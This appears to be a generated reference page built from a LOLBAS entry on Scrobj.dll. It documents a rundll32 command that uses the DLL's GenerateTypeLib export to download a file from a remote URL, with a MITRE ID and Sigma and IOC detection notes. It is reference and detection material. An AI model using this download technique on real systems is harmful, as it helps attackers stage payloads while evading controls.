---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Scrobj.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `scrobj.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Scrobj.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Scrobj.dll](../../tools/windows/scrobj.dll.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | scrobj.dll |
| name | Scrobj.dll |
| type | tool |
| source | lolbas |
| url | https://twitter.com/eral4m/status/1479106975967240209 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@eral4m'
  Person: Eral4m
Author: Eral4m
Commands:
- Category: Download
  Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
  Description: Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from remote location.
Created: 2021-01-07
Description: Windows Script Component Runtime
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line
Full_Path:
- Path: c:\windows\system32\scrobj.dll
- Path: c:\windows\syswow64\scrobj.dll
Name: Scrobj.dll
Resources:
- Link: https://twitter.com/eral4m/status/1479106975967240209
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Scrobj.yml
```

## Detection / Analysis Notes

```text
IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line
```
